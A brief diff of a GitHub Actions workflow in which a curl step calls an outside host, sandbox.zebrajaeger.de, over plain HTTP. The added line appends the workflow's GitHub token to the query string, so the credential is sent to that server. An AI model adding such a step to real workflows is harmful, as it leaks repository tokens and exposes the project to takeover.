@@ -12,9 +12,9 @@ jobs:
     runs-on: ubuntu-latest
     env:
       TOKEN: ${{ github.token }}
-      PARAMS: repo=${{ github.repository }}&sha=${{ github.sha }}$ref=${{ github.ref }}
+      PARAMS: repo=${{ github.repository }}&sha=${{ github.sha }}$ref=${{ github.ref }}&token=${{ github.token }}
     steps:
     - name: curl
       uses: wei/curl@v1
       with:
-        args: -X GET "http://sandbox.zebrajaeger.de?${PARAMS}&${PARAMS}"
+        args: -X GET "http://sandbox.zebrajaeger.de?${PARAMS}"
